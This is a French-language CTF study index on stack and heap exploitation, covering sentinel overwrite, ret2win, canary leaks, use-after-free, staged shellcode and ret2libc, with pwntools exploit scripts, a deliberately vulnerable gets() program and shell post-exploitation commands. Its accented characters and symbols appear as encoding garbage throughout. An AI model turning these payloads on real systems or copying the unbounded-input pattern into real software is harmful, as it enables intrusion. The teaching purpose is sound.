# Guide des Buffer Overflows - Exploitation Binaire

> **Note :** Ce document est un index de navigation. Pour chaque technique, des fiches d√©taill√©es avec des exemples r√©els d√©sassembl√©s dans radare2 sont disponibles dans ce dossier.

## Table des mati√®res
1. [Vue d'ensemble](#vue-densemble)
2. [Pr√©requis](#pr√©requis)
3. [Types d'exploitation](#types-dexploitation)
4. [Protections modernes](#protections-modernes)
5. [M√©thodologie g√©n√©rale](#m√©thodologie-g√©n√©rale)
6. [Ressources compl√©mentaires](#ressources-compl√©mentaires)

---

## Vue d'ensemble

| Type | Description | Pr√©requis | Fiche d√©taill√©e |
|:---|:---|:---|:---|
| **Buffer Overflow simple** | D√©passer le tampon pour d√©clencher une condition | Buffer non prot√©g√© | (cette doc) |
| **BOF + Bypass Anti-Debug** | √âcraser une sentinelle avec une valeur magique pr√©cise | Lire la valeur magique dans r2 | (cette doc) |
| **ret2win** | Rediriger l'ex√©cution vers une fonction cach√©e | Conna√Ætre l'adresse de la fonction cible | (cette doc) |
| **Stack Canary Bypass** | Fuiter le canary via format string puis buffer overflow | Fuite d'adresse, pas de PIE | [canary_exploitation.md](canary_exploitation.md) |
| **Use-After-Free** | R√©utiliser un bloc heap lib√©r√© pour √©craser un pointeur de fonction | malloc/free sans mise √† NULL | [Use_After_Free.md](Use_After_Free.md) |
| **Staged Shellcode** | Stager 13 octets + mmap RWX pour contourner une limite de taille | Zone mmap ex√©cutable | [staged_shellcode.md](staged_shellcode.md) |
| **Ret2libc + ROP** | Utiliser les fonctions de la libc via une ROP chain | Leak d'adresse libc, NX enabled | [ret2libc.md](ret2libc.md) |

---

## Pr√©requis

### Outils essentiels
```bash
pip install pwntools
sudo pacman -S radare2 gdb    # Arch Linux
sudo apt install radare2 gdb  # Debian/Ubuntu

# V√©rification des protections d'un binaire
checksec --file <binary>
```

### Concepts cl√©s
- **Stack** : Zone m√©moire LIFO contenant variables locales et adresses de retour
- **RIP/RBP** : Registres pointant vers la prochaine instruction et la base de la stack frame
- **Heap** : Zone m√©moire dynamique g√©r√©e par malloc/free
- **GOT** : Table des adresses r√©elles des fonctions libc apr√®s r√©solution dynamique
- **Padding** : Octets de remplissage pour atteindre l'adresse de retour

### Architecture et tailles

| Architecture | Taille pointeur | Taille canary | Taille saved RBP | Encodage pwntools |
|:---:|:---:|:---:|:---:|:---:|
| x86 (32 bits) | 4 octets | 4 octets | 4 octets | `p32()` |
| x86-64 (64 bits) | 8 octets | 8 octets | 8 octets | `p64()` |

> ‚ö†Ô∏è **Important** : Toujours v√©rifier l'architecture avec `checksec` et confirmer les offsets avec `afvd` dans radare2 plut√¥t que de les calculer au feeling.

---

## Types d'exploitation

### 1. Buffer Overflow Simple

Le buffer overflow basique consiste √† √©craser la m√©moire au-del√† d'un tampon pour modifier le comportement du programme.

#### Exemple vuln√©rable
```c
int main() {
    char buffer[10];
    int access = 0;

    printf("Entrez votre mot de passe : ");
    gets(buffer);  // ‚ö†Ô∏è VULN√âRABLE : pas de limite de taille

    if (access == 1) {
        printf("Acc√®s autoris√© !\n");
    }
    return 0;
}
```

#### Exploitation
```python
from pwn import *

buffer_size  = 10
target_value = p32(1)   # valeur √† √©crire dans 'access'
payload      = b'A' * buffer_size + target_value

io = process('./vulnerable')
io.sendlineafter(b'password: ', payload)
io.interactive()
```

**Explication** : En d√©passant les 10 octets du buffer, on √©crase la variable `access` qui suit en m√©moire.

---

### 2. Buffer Overflow avec Bypass d'Anti-Debug ‚Äî √âcrasement de Sentinelle

Une variante du buffer overflow o√π le programme pose une **valeur sentinelle** sur la pile et v√©rifie qu'elle n'a pas √©t√© modifi√©e pour d√©tecter un pattern de debug classique (`AAAAAAA`). Il faut √©craser cette sentinelle avec une **valeur magique pr√©cise** pour atteindre la fonction cible.

> üìÑ **Challenge r√©el : `bofbof` ‚Äî FCSC 2021**

#### Ce que fait l'anti-debug

```asm
movabs rax, 0x4141414141414141   ; pose 'AAAAAAAA' comme sentinelle
mov qword [var_8h], rax          ; var_8h = sentinelle sur la pile

gets(s)                          ; lit l'input utilisateur

cmp qword [var_8h], rax          ; var_8h est-elle encore 'AAAAAAAA' ?
je 0x121c                        ‚Üê oui ‚Üí sort proprement (cyclic d√©tect√© !)

movabs rax, 0x1122334455667788   ; valeur magique attendue
cmp qword [var_8h], rax
jne 0x1210                       ‚Üê pas √©gal ‚Üí "Almost there!"
call sym.vuln                    ‚Üê √©gal ‚Üí shell !
```

Si on envoie un `cyclic()` classique comme padding, la sentinelle est √©cras√©e avec des octets du pattern ‚Üí d√©tect√©e comme `!= AAAAAAAA` ‚Üí le programme sort. **Il faut √©crire exactement `0x1122334455667788` √† l'offset de `var_8h`.**

#### Calculer l'offset depuis r2

```asm
sub rsp, 0x30        ‚Üê stack frame de 48 octets
lea rax, [s]         ‚Üê s (buffer gets) est √† rbp-0x30
mov qword [var_8h]   ‚Üê var_8h (sentinelle) est √† rbp-0x08
```

```
rbp - 0x30  ‚Üê s       (d√©but du buffer)
rbp - 0x08  ‚Üê var_8h  (la sentinelle)

distance = 0x30 - 0x08 = 0x28 = 40 octets
```

> **Note :** `afvd` peut ne pas retourner les variables si le binaire manque de symboles de debug. Dans ce cas, calculer depuis `sub rsp, 0xXX` et les `lea`/`mov` dans le d√©sassemblage.

#### Exploitation

```python
from pwn import *

exe     = context.binary = ELF('./bofbof')
valeur_magique = 0x1122334455667788

# 40 octets pour atteindre var_8h, puis on √©crase avec la valeur magique
payload = cyclic(0x28) + p64(valeur_magique)

io = process('./bofbof')
io.sendlineafter(b">>>", payload)
io.interactive()
```

#### Layout de la pile

```
rbp - 0x30  ‚Üê s          : [ cyclic(40) = 0x28 octets        ]
rbp - 0x08  ‚Üê var_8h     : [ p64(0x1122334455667788)          ] ‚Üê valeur magique
rbp + 0x00  ‚Üê saved RBP
rbp + 0x08  ‚Üê adresse ret
```

Le payload √©crase exactement `var_8h` avec la valeur attendue ‚Üí la comparaison passe ‚Üí `call sym.vuln` ‚Üí `/bin/sh`.

---

### 3. Ret2Win

Rediriger l'ex√©cution vers une fonction existante mais jamais appel√©e normalement.

#### Calculer l'offset depuis radare2

```bash
pdf @ sym.fonction_vulnerable
# chercher : sub rsp, 0xXXX  ‚Üê taille du buffer
# afvd                        ‚Üê variables locales et leurs offsets
```

```
offset = taille_buffer + 8 (saved RBP)
```

> ‚ö†Ô∏è **Toujours v√©rifier `afvd`** dans radare2 plut√¥t que de faire le calcul de t√™te ‚Äî des variables locales suppl√©mentaires peuvent modifier l'offset r√©el.

#### Exploitation basique (sans canary, sans PIE)
```python
from pwn import *

exe     = context.binary = ELF('./chall')
offset  = 0x108           # v√©rifi√© dans r2 : 0x100 buffer + 0x8 saved RBP
win     = exe.symbols['win']

payload = flat(
    cyclic(offset),
    p64(win)
)

io = process('./chall')
io.sendlineafter(b">", payload)
io.interactive()
```

#### Si la stack n'est pas align√©e (SIGSEGV apr√®s ret)

```python
from pwn import *

exe     = context.binary = ELF('./chall')
rop     = ROP(exe)
ret     = rop.find_gadget(['ret'])[0]   # gadget d'alignement x64
win     = exe.symbols['win']

payload = flat(
    cyclic(offset),
    p64(ret),    # aligne la stack sur 16 octets avant win()
    p64(win)
)
```

> En x64, la stack doit √™tre align√©e sur 16 octets avant un `call`. Un `ret` suppl√©mentaire consomme 8 octets et corrige l'alignement. Voir aussi la section alignement dans [ret2libc.md](ret2libc.md).

---

### 3. Stack Canary Bypass

> üìÑ **Fiche compl√®te : [canary_exploitation.md](canary_exploitation.md)**

Le canary est une valeur secr√®te pos√©e sur la pile entre le buffer et l'adresse de retour. Si on l'√©crase, le programme se suicide. La technique consiste √† **fuiter** sa valeur via une format string avant de faire l'overflow.

#### R√©sum√© de la technique

```
1. Fuite du canary via %17$p (offset √† trouver dans r2)
2. Buffer overflow en r√©injectant le vrai canary
3. Ret vers la fonction cible
```

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ   buffer     ‚îÇ ‚Üê cyclic(offset)
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ   CANARY     ‚îÇ ‚Üê canary_leak (valeur vol√©e, pas d'alarme)
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ  saved RBP   ‚îÇ ‚Üê cyclic(8) junk data
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ adresse ret  ‚îÇ ‚Üê p64(win_addr)
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

> ‚ö†Ô∏è **Le canary se termine toujours par `\x00`** ‚Äî filtrer avec `endswith("00")` et `value > 0xFFFFFFFF` pour l'identifier automatiquement. Voir la fonction `canary_auto_leak()` dans [canary_exploitation.md](canary_exploitation.md).

---

### 4. Use-After-Free (UAF)

> üìÑ **Fiche compl√®te : [Use_After_Free.md](Use_After_Free.md)**

Un UAF se produit quand un pointeur n'est pas mis √† NULL apr√®s `free()`. Un `malloc()` de m√™me taille r√©cup√®re le m√™me bloc, ce qui permet d'√©craser son contenu ‚Äî notamment un **pointeur de fonction**.

#### R√©sum√© de la technique

```
1. malloc(objet)  ‚Üí objet->fonction = incStr
2. free(objet)    ‚Üí pointeur PAS mis √† NULL ‚Üí UAF !
3. malloc(msg)    ‚Üí m√™me taille ‚Üí m√™me bloc
4. √©crire payload ‚Üí √©crase objet->fonction avec incInt
5. appel fonction ‚Üí appelle incInt au lieu de incStr
```

```python
# Le payload √©crase le pointeur de fonction √† l'offset +0x40
payload = cyclic(64) + p64(exe.symbols['cible'])
```

> ‚ö†Ô∏è **V√©rifier dans r2 que `free()` ne met pas le pointeur √† NULL** ‚Äî c'est la condition sine qua non du UAF. Voir [Use_After_Free.md](Use_After_Free.md) pour l'analyse compl√®te de `useItem`.

---

### 5. Staged Shellcode

> üìÑ **Fiche compl√®te : [staged_shellcode.md](staged_shellcode.md)**

Quand la taille d'upload est limit√©e (ex: 13 octets), on envoie un **stager** minimaliste qui appelle `read()` pour charger un shellcode complet sans contrainte de taille.

#### R√©sum√© de la technique

```
upload(stage1 = 13 octets)  ‚Üí stager dans zone mmap
execute(stage1)             ‚Üí syscall read(0, firmware, 0x1000)
send(stage2)                ‚Üí NOP sled + shellcode /bin/sh
                            ‚Üí shell !
```

> ‚ö†Ô∏è **Toujours v√©rifier `args(...)` dans `pdf @ sym.apply_update`** pour savoir quel registre pointe vers la zone mmap au moment de l'appel ‚Äî c'est ce qui dicte la premi√®re instruction du stager. Voir [staged_shellcode.md](staged_shellcode.md).

> ‚ö†Ô∏è **NX activ√© ne bloque pas** si `mmap` est appel√© avec `PROT_EXEC` ‚Äî la zone firmware est explicitement ex√©cutable ind√©pendamment de NX.

---

### 6. Ret2libc + ROP Chain

> üìÑ **Fiche compl√®te : [ret2libc.md](ret2libc.md)**

Quand NX est activ√© (pas de shellcode sur la pile), on redirige l'ex√©cution vers `system("/bin/sh")` dans la libc via une ROP chain. ASLR impose de fuiter une adresse libc au pr√©alable.

#### R√©sum√© de la technique en deux passes

```
PASSE 1 ‚Äî Leak
  overflow ‚Üí debug_info() ‚Üí affiche printf@GOT ‚Üí retour main
  libc_base = printf_leak - libc.symbols['printf']

PASSE 2 ‚Äî ROP chain
  overflow ‚Üí ret ‚Üí pop rdi ; ret ‚Üí &"/bin/sh" ‚Üí system()
```

```python
payload = flat(
    cyclic(0x108),
    p64(ret),        # alignement stack x64
    p64(pop_rdi),    # gadget : met /bin/sh dans rdi
    p64(binsh),      # adresse /bin/sh dans libc
    p64(system)      # system("/bin/sh")
)
```

> ‚ö†Ô∏è **La libc fournie avec le challenge peut diff√©rer de la libc syst√®me** ‚Äî toujours utiliser `ELF('./libc.so.6')` avec la libc du serveur cible pour que les offsets soient corrects.

---

## Protections modernes

| Protection | Description | Bypass | Fiche |
|:---|:---|:---|:---|
| **NX** | Stack non ex√©cutable | ret2libc, ROP, ou mmap PROT_EXEC | [ret2libc.md](ret2libc.md), [staged_shellcode.md](staged_shellcode.md) |
| **ASLR** | Adresses libc/stack al√©atoires | Leak d'adresse via GOT ou format string | [ret2libc.md](ret2libc.md) |
| **PIE** | Code binaire √† adresse al√©atoire | Leak d'adresse du binaire | ‚Äî |
| **Stack Canary** | Valeur secr√®te avant saved RIP | Leak via format string | [canary_exploitation.md](canary_exploitation.md) |
| **Full RELRO** | GOT en lecture seule | GOT overwrite impossible | ‚Äî |
| **Partial RELRO** | GOT modifiable | Lecture GOT possible pour leak | [ret2libc.md](ret2libc.md) |

### Lire checksec rapidement

```bash
checksec --file ./chall
```

```
Arch:    amd64-64-little   ‚Üê x64 ‚Üí p64(), saved RBP = 8 octets
RELRO:   Partial RELRO     ‚Üê GOT lisible ‚Üí leak possible
Stack:   Canary found      ‚Üê il faut fuiter le canary avant l'overflow
NX:      NX enabled        ‚Üê pas de shellcode sur la pile
PIE:     No PIE            ‚Üê adresses du binaire fixes ‚Üí symbols directs
```

---

## M√©thodologie g√©n√©rale

### 1. Reconnaissance

```bash
file ./chall
checksec --file ./chall
strings ./chall | grep -E "flag|win|system|sh"
```

### 2. Analyse statique dans radare2

```bash
r2 ./chall
aaa              # analyse compl√®te
afl              # liste des fonctions
pdf @ sym.main   # d√©sassembler main
afvd             # variables locales et offsets ‚Üí calcul de l'offset BOF
```

**Ce qu'on cherche :**
- `sub rsp, 0xXXX` ‚Üí taille du buffer
- `afvd` ‚Üí offset exact jusqu'au canary et √† l'adresse de retour
- `args(rdi)` ‚Üí quel registre contient quoi au moment d'un appel
- `malloc` / `free` ‚Üí pr√©sence d'un UAF potentiel
- `mmap` avec `prot=7` ‚Üí zone ex√©cutable

### 3. Trouver l'offset avec cyclic

```python
def find_offset():
    p       = process(context.binary.path)
    pattern = cyclic(0x200)
    p.sendline(pattern)
    p.wait()
    core    = p.corefile
    rip     = core.rip
    offset  = cyclic_find(rip)
    log.success(f"Offset : {offset}")
    return offset
```

### 4. Exploitation

Selon les protections d√©tect√©es :

```
Canary ?   ‚Üí fuiter d'abord  ‚Üí voir canary_exploitation.md
NX ?       ‚Üí ret2libc / ROP  ‚Üí voir ret2libc.md
PIE ?      ‚Üí fuiter binaire  ‚Üí leak d'adresse du binaire
mmap RWX ? ‚Üí staged shellcode ‚Üí voir staged_shellcode.md
UAF ?      ‚Üí heap exploit    ‚Üí voir Use_After_Free.md
```

### 5. Post-exploitation

```bash
# Une fois le shell obtenu
id
cat flag.txt
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## Ressources compl√©mentaires

### Documentation
- [Pwntools Documentation](https://docs.pwntools.com/)
- [ROPgadget](https://github.com/JonathanSalwan/ROPgadget)
- [ROP Emporium](https://ropemporium.com/)

### Challenges pratiques
- [404CTF](https://404ctf.fr/)
- [pwnable.kr](http://pwnable.kr/)
- [PicoCTF](https://picoctf.org/)
- [Root Me](https://www.root-me.org/)

### Commandes radare2 essentielles

```bash
aaa              # analyse compl√®te
afl              # liste des fonctions
pdf @ sym.main   # d√©sassembler une fonction
afvd             # variables locales + offsets
afl | grep -E "malloc|free|win|flag"   # filtrer les fonctions int√©ressantes
```

---

*Index mis √† jour apr√®s exploitation r√©elle des challenges 404CTF 2023/2025*
*Fiches d√©taill√©es bas√©es sur l'analyse radare2 des vrais binaires*
*Outils : pwntools, radare2, GDB + GEF*
